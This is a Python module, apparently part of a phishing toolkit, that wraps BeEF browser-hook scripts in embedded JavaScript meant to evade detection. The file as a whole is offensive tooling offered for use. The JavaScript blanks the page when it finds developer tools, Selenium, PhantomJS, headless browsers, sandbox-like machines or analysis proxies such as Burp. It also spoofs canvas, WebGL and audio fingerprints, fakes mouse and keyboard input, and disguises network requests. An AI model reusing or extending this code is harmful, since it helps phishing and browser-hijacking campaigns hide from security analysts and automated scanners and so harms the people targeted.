"""
Detection Evasion Engine
Advanced detection evasion techniques for BeEF and phishing operations
"""

import os
import json
import base64
import secrets
import time
import hashlib
import urllib.parse
from datetime import datetime, timezone, timedelta
from typing import Dict, Optional, Any, List, Tuple
import logging
import re
import threading
import random

# Configure logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

class DetectionEvasionConfig:
    """Detection evasion configuration"""

    def __init__(self):
        self.enable_anti_debugging = os.getenv("ENABLE_ANTI_DEBUGGING", "true").lower() == "true"
        self.enable_anti_automation = os.getenv("ENABLE_ANTI_AUTOMATION", "true").lower() == "true"
        self.enable_anti_sandbox = os.getenv("ENABLE_ANTI_SANDBOX", "true").lower() == "true"
        self.enable_anti_analysis = os.getenv("ENABLE_ANTI_ANALYSIS", "true").lower() == "true"
        self.enable_anti_fingerprinting = os.getenv("ENABLE_ANTI_FINGERPRINTING", "true").lower() == "true"
        self.enable_anti_detection = os.getenv("ENABLE_ANTI_DETECTION", "true").lower() == "true"
        self.enable_behavior_mimicking = os.getenv("ENABLE_BEHAVIOR_MIMICKING", "true").lower() == "true"
        self.enable_traffic_obfuscation = os.getenv("ENABLE_TRAFFIC_OBFUSCATION", "true").lower() == "true"

class DetectionEvasionEngine:
    """Detection evasion engine for advanced anti-detection techniques"""

    def __init__(self, mongodb_connection=None, redis_client=None):
        self.mongodb = mongodb_connection
        self.redis = redis_client

        self.config = DetectionEvasionConfig()
        self.evasion_techniques: Dict[str, str] = {}
        self.detection_cache: Dict[str, str] = {}

        # Load evasion techniques
        self._load_evasion_techniques()

    def _load_evasion_techniques(self):
        """Load detection evasion techniques"""
        try:
            # Anti-debugging techniques
            self.evasion_techniques["anti_debugging"] = """
            (function() {
                'use strict';
                
                // Detect debugger
                var devtools = {
                    open: false,
                    orientation: null
                };
                
                var threshold = 160;
                
                setInterval(function() {
                    if (window.outerHeight - window.innerHeight > threshold || 
                        window.outerWidth - window.innerWidth > threshold) {
                        if (!devtools.open) {
                            devtools.open = true;
                            // Redirect or exit if debugger detected
                            window.location.href = 'about:blank';
                        }
                    } else {
                        devtools.open = false;
                    }
                }, 500);
                
                // Console detection
                var devtools = /./;
                devtools.toString = function() {
                    this.opened = true;
                    return '';
                };
                
                console.log('%c', devtools);
                devtools.toString = function() {
                    this.opened = false;
                    return '';
                };
                
                if (devtools.opened) {
                    window.location.href = 'about:blank';
                }
            })();
            """

            # Anti-automation techniques
            self.evasion_techniques["anti_automation"] = """
            (function() {
                'use strict';
                
                // Detect headless browsers
                if (navigator.webdriver) {
                    window.location.href = 'about:blank';
                    return;
                }
                
                // Detect automation frameworks
                var automationDetected = false;
                
                // Check for common automation properties
                if (window.chrome && window.chrome.runtime && window.chrome.runtime.onConnect) {
                    automationDetected = true;
                }
                
                // Check for selenium
                if (window.document && window.document.$cdc_asdjflasutopfhvcZLmcfl_) {
                    automationDetected = true;
                }
                
                // Check for phantomjs
                if (window.callPhantom || window._phantom || window.phantom) {
                    automationDetected = true;
                }
                
                if (automationDetected) {
                    window.location.href = 'about:blank';
                    return;
                }
                
                // Mouse movement detection
                var mouseMovements = 0;
                document.addEventListener('mousemove', function() {
                    mouseMovements++;
                });
                
                // Check for lack of mouse movement (automation indicator)
                setTimeout(function() {
                    if (mouseMovements < 3) {
                        window.location.href = 'about:blank';
                    }
                }, 5000);
            })();
            """

            # Anti-sandbox techniques
            self.evasion_techniques["anti_sandbox"] = """
            (function() {
                'use strict';
                
                // Detect sandbox environments
                var sandboxDetected = false;
                
                // Check for virtual machine indicators
                if (navigator.hardwareConcurrency < 2) {
                    sandboxDetected = true;
                }
                
                // Check for unusual screen resolution
                if (screen.width < 1024 || screen.height < 768) {
                    sandboxDetected = true;
                }
                
                // Check for missing plugins
                if (navigator.plugins.length === 0) {
                    sandboxDetected = true;
                }
                
                // Check for unusual timezone
                var timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
                if (timezone === 'UTC' || timezone === 'GMT') {
                    sandboxDetected = true;
                }
                
                if (sandboxDetected) {
                    window.location.href = 'about:blank';
                    return;
                }
                
                // Check for rapid execution (sandbox indicator)
                var startTime = Date.now();
                setTimeout(function() {
                    var executionTime = Date.now() - startTime;
                    if (executionTime < 100) { // Too fast for real browser
                        window.location.href = 'about:blank';
                    }
                }, 1000);
            })();
            """

            # Anti-analysis techniques
            self.evasion_techniques["anti_analysis"] = """
            (function() {
                'use strict';
                
                // Detect analysis tools
                var analysisDetected = false;
                
                // Check for common analysis tools
                var analysisTools = [
                    'fiddler', 'wireshark', 'burp', 'charles', 'mitmproxy',
                    'proxyman', 'httptoolkit', 'postman', 'insomnia'
                ];
                
                var userAgent = navigator.userAgent.toLowerCase();
                for (var i = 0; i < analysisTools.length; i++) {
                    if (userAgent.indexOf(analysisTools[i]) !== -1) {
                        analysisDetected = true;
                        break;
                    }
                }
                
                // Check for developer tools
                if (window.outerHeight - window.innerHeight > 200) {
                    analysisDetected = true;
                }
                
                if (analysisDetected) {
                    window.location.href = 'about:blank';
                    return;
                }
                
                // Check for unusual request patterns
                var requestCount = 0;
                var originalFetch = window.fetch;
                window.fetch = function() {
                    requestCount++;
                    if (requestCount > 10) { // Too many requests
                        window.location.href = 'about:blank';
                        return;
                    }
                    return originalFetch.apply(this, arguments);
                };
            })();
            """

            # Anti-fingerprinting techniques
            self.evasion_techniques["anti_fingerprinting"] = """
            (function() {
                'use strict';
                
                // Randomize canvas fingerprint
                var originalToDataURL = HTMLCanvasElement.prototype.toDataURL;
                HTMLCanvasElement.prototype.toDataURL = function() {
                    var ctx = this.getContext('2d');
                    if (ctx) {
                        // Add random noise
                        var imageData = ctx.getImageData(0, 0, this.width, this.height);
                        var data = imageData.data;
                        for (var i = 0; i < data.length; i += 4) {
                            if (Math.random() < 0.01) {
                                data[i] = Math.floor(Math.random() * 256);
                                data[i + 1] = Math.floor(Math.random() * 256);
                                data[i + 2] = Math.floor(Math.random() * 256);
                            }
                        }
                        ctx.putImageData(imageData, 0, 0);
                    }
                    return originalToDataURL.apply(this, arguments);
                };
                
                // Randomize WebGL fingerprint
                var originalGetParameter = WebGLRenderingContext.prototype.getParameter;
                WebGLRenderingContext.prototype.getParameter = function(parameter) {
                    if (parameter === this.VENDOR) {
                        return 'WebKit';
                    } else if (parameter === this.RENDERER) {
                        return 'WebKit WebGL';
                    }
                    return originalGetParameter.apply(this, arguments);
                };
                
                // Randomize audio context
                var originalCreateAnalyser = AudioContext.prototype.createAnalyser;
                AudioContext.prototype.createAnalyser = function() {
                    var analyser = originalCreateAnalyser.apply(this, arguments);
                    var originalGetFloatFrequencyData = analyser.getFloatFrequencyData;
                    analyser.getFloatFrequencyData = function(array) {
                        originalGetFloatFrequencyData.apply(this, arguments);
                        // Add random noise
                        for (var i = 0; i < array.length; i++) {
                            array[i] += (Math.random() - 0.5) * 0.001;
                        }
                    };
                    return analyser;
                };
            })();
            """

            # Behavior mimicking techniques
            self.evasion_techniques["behavior_mimicking"] = """
            (function() {
                'use strict';
                
                // Simulate human behavior
                function simulateHumanBehavior() {
                    // Random mouse movements
                    var mouseEvents = ['mousemove', 'mousedown', 'mouseup', 'click'];
                    var eventCount = Math.floor(Math.random() * 5) + 1;
                    
                    for (var i = 0; i < eventCount; i++) {
                        setTimeout(function() {
                            var event = new MouseEvent(mouseEvents[Math.floor(Math.random() * mouseEvents.length)], {
                                clientX: Math.random() * window.innerWidth,
                                clientY: Math.random() * window.innerHeight
                            });
                            document.dispatchEvent(event);
                        }, Math.random() * 2000);
                    }
                    
                    // Random keyboard events
                    var keyEvents = ['keydown', 'keyup', 'keypress'];
                    var keyCount = Math.floor(Math.random() * 3) + 1;
                    
                    for (var i = 0; i < keyCount; i++) {
                        setTimeout(function() {
                            var event = new KeyboardEvent(keyEvents[Math.floor(Math.random() * keyEvents.length)], {
                                key: String.fromCharCode(65 + Math.floor(Math.random() * 26))
                            });
                            document.dispatchEvent(event);
                        }, Math.random() * 3000);
                    }
                    
                    // Random scroll events
                    setTimeout(function() {
                        window.scrollTo(0, Math.random() * 100);
                    }, Math.random() * 4000);
                }
                
                // Start behavior simulation
                setTimeout(simulateHumanBehavior, Math.random() * 2000 + 1000);
                
                // Continue behavior simulation
                setInterval(simulateHumanBehavior, Math.random() * 10000 + 5000);
            })();
            """

            # Traffic obfuscation techniques
            self.evasion_techniques["traffic_obfuscation"] = """
            (function() {
                'use strict';
                
                // Obfuscate network requests
                var originalFetch = window.fetch;
                window.fetch = function(url, options) {
                    // Add random headers
                    if (!options) options = {};
                    if (!options.headers) options.headers = {};
                    
                    options.headers['X-Requested-With'] = 'XMLHttpRequest';
                    options.headers['X-Random-ID'] = Math.random().toString(36).substr(2, 9);
                    options.headers['X-Timestamp'] = Date.now().toString();
                    
                    // Add random delay
                    var delay = Math.random() * 1000 + 500;
                    return new Promise(function(resolve) {
                        setTimeout(function() {
                            resolve(originalFetch(url, options));
                        }, delay);
                    });
                };
                
                // Obfuscate XMLHttpRequest
                var originalXHROpen = XMLHttpRequest.prototype.open;
                XMLHttpRequest.prototype.open = function(method, url, async, user, password) {
                    // Add random query parameters
                    var separator = url.indexOf('?') === -1 ? '?' : '&';
                    url += separator + 't=' + Date.now() + '&r=' + Math.random().toString(36).substr(2, 9);
                    
                    return originalXHROpen.call(this, method, url, async, user, password);
                };
            })();
            """

            logger.info(f"Loaded {len(self.evasion_techniques)} detection evasion techniques")

        except Exception as e:
            logger.error(f"Error loading evasion techniques: {e}")

    def evade_detection(self, hook_script: str, target_url: str = None) -> str:
        """
        Apply detection evasion techniques to hook script

        Args:
            hook_script: Original hook script
            target_url: Target URL for context

        Returns:
            Enhanced hook script with evasion techniques
        """
        try:
            if not hook_script:
                return hook_script

            # Select evasion techniques based on configuration
            selected_techniques = self._select_evasion_techniques(target_url)

            # Apply techniques in order
            enhanced_script = hook_script
            for technique_id in selected_techniques:
                if technique_id in self.evasion_techniques:
                    technique_code = self.evasion_techniques[technique_id]
                    
                    # Wrap technique around the script
                    enhanced_script = self._wrap_with_evasion(enhanced_script, technique_code, technique_id)

            # Cache enhanced script
            cache_key = f"evasion_{hashlib.md5(enhanced_script.encode()).hexdigest()[:8]}"
            self.detection_cache[cache_key] = enhanced_script

            logger.info(f"Applied detection evasion techniques to hook script")
            return enhanced_script

        except Exception as e:
            logger.error(f"Error applying detection evasion: {e}")
            return hook_script

    def _select_evasion_techniques(self, target_url: str = None) -> List[str]:
        """Select evasion techniques to apply"""
        try:
            # Get enabled techniques based on configuration
            enabled_techniques = []

            if self.config.enable_anti_debugging:
                enabled_techniques.append("anti_debugging")
            if self.config.enable_anti_automation:
                enabled_techniques.append("anti_automation")
            if self.config.enable_anti_sandbox:
                enabled_techniques.append("anti_sandbox")
            if self.config.enable_anti_analysis:
                enabled_techniques.append("anti_analysis")
            if self.config.enable_anti_fingerprinting:
                enabled_techniques.append("anti_fingerprinting")
            if self.config.enable_behavior_mimicking:
                enabled_techniques.append("behavior_mimicking")
            if self.config.enable_traffic_obfuscation:
                enabled_techniques.append("traffic_obfuscation")

            # Select random subset (3-5 techniques)
            num_techniques = min(len(enabled_techniques), random.randint(3, 5))
            selected = random.sample(enabled_techniques, num_techniques)

            return selected

        except Exception as e:
            logger.error(f"Error selecting evasion techniques: {e}")
            return ["anti_debugging", "anti_automation", "anti_sandbox"]  # Fallback

    def _wrap_with_evasion(self, hook_script: str, evasion_code: str, technique_id: str) -> str:
        """Wrap hook script with evasion technique"""
        try:
            # Create wrapper that includes both evasion and hook
            wrapper = f"""
            (function() {{
                'use strict';
                
                // Detection evasion: {technique_id}
                {evasion_code}
                
                // Original hook script
                {hook_script}
            }})();
            """
            
            return wrapper

        except Exception as e:
            logger.error(f"Error wrapping with evasion: {e}")
            return hook_script

    def get_evasion_statistics(self) -> Dict[str, Any]:
        """Get evasion statistics"""
        try:
            return {
                "total_techniques": len(self.evasion_techniques),
                "enabled_techniques": len([t for t in self.evasion_techniques.keys() if self._is_technique_enabled(t)]),
                "cache_size": len(self.detection_cache),
                "techniques": {
                    technique_id: {
                        "enabled": self._is_technique_enabled(technique_id)
                    }
                    for technique_id in self.evasion_techniques.keys()
                },
                "timestamp": datetime.now(timezone.utc).isoformat()
            }

        except Exception as e:
            logger.error(f"Error getting evasion statistics: {e}")
            return {"error": "Failed to get statistics"}

    def _is_technique_enabled(self, technique_id: str) -> bool:
        """Check if technique is enabled"""
        try:
            if technique_id == "anti_debugging":
                return self.config.enable_anti_debugging
            elif technique_id == "anti_automation":
                return self.config.enable_anti_automation
            elif technique_id == "anti_sandbox":
                return self.config.enable_anti_sandbox
            elif technique_id == "anti_analysis":
                return self.config.enable_anti_analysis
            elif technique_id == "anti_fingerprinting":
                return self.config.enable_anti_fingerprinting
            elif technique_id == "behavior_mimicking":
                return self.config.enable_behavior_mimicking
            elif technique_id == "traffic_obfuscation":
                return self.config.enable_traffic_obfuscation
            
            return False

        except Exception as e:
            logger.error(f"Error checking technique enabled status: {e}")
            return False

# Global evasion engine instance
evasion_engine = None

def initialize_evasion_engine(mongodb_connection=None, redis_client=None) -> DetectionEvasionEngine:
    """Initialize global evasion engine"""
    global evasion_engine
    evasion_engine = DetectionEvasionEngine(mongodb_connection, redis_client)
    return evasion_engine

def get_evasion_engine() -> DetectionEvasionEngine:
    """Get global evasion engine"""
    if evasion_engine is None:
        raise ValueError("Evasion engine not initialized")
    return evasion_engine

# Convenience functions
def evade_detection(hook_script: str, target_url: str = None) -> str:
    """Evade detection (global convenience function)"""
    return get_evasion_engine().evade_detection(hook_script, target_url)

def get_evasion_statistics() -> Dict[str, Any]:
    """Get evasion statistics (global convenience function)"""
    return get_evasion_engine().get_evasion_statistics()
